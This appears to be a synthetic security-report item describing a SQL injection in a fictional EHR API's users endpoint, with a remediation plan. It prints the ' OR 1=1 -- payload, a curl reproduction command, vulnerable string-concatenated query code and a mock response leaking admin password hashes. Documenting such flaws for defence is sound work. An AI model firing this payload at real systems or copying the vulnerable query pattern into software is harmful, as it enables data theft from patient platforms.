# Security Analysis Report
**System:** PatientCore EHR API
**Domain:** Healthcare / EHR Platform
**Example ID:** INJ-0001
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | SQL Injection | SQL injection via `id` parameter on `/api/v3/users` — attacker injects `' OR 1=1 --` to bypass WHERE clause filter and dump all user records including admin credentials |

---

## Finding 1 — SQL Injection

### Summary
The `/api/v3/users` endpoint on PatientCore EHR API (`api.patientcore-ehr.example.com`) constructs a SQL query using raw string concatenation (`${req.query.id}`). Per §3.0 and §4.0, this legacy endpoint was missed during the parameterization migration. An attacker injects `' OR 1=1 --` — the single quote closes the string literal, `OR 1=1` makes the WHERE condition always true, and `--` comments out the rest of the SQL statement. All user records are returned, including admin credentials.

**Pattern:** SQL Injection
**Affected endpoint:** `GET https://api.patientcore-ehr.example.com/api/v3/users`
**Vulnerable parameter:** `id`

### Evidence from HAR (§5.0)

**Request — Attack**
```
GET https://api.patientcore-ehr.example.com/api/v3/users?id=%27%20OR%201=1%20--
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Accept: application/json
```

**Injected payload:** `id=' OR 1=1 --` (URL-decoded)

**Response — All User Records Returned (SQL WHERE bypassed)**
```json
{
  "data": [
    {"id": 1, "username": "admin", "password_hash": "$2b$12$secret", "role": "ADMIN"},
    {"id": 2, "username": "user2", "password_hash": "$2b$12$abc"}
  ]
}
```
Admin credentials exposed: `username: admin`, `password_hash: $2b$12$secret`, `role: ADMIN`. SQL WHERE clause bypassed — all user records returned.

**Vulnerable code (§3.0):**
```javascript
const query = `SELECT * FROM users WHERE id = '${req.query.id}'`;
db.execute(query, (err, results) => { ... });
```

### Steps to Reproduce
```bash
curl -s -G "https://api.patientcore-ehr.example.com/api/v3/users" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Accept: application/json" \
  --data-urlencode "id=' OR 1=1 --"
# Vulnerable: all user records including admin credentials returned
# Secure: {"data": [], "error": "Invalid id parameter"}
```

### Remediation
1. Replace raw string concatenation with parameterized queries: `db.execute("SELECT * FROM users WHERE id = ?", [req.query.id])`.
2. Validate `id` parameter — reject non-numeric/non-UUID values.
3. Remove over-privileged DB account — use least-privilege read-only role.
4. Deploy WAF with SQLi detection rules on legacy endpoints.
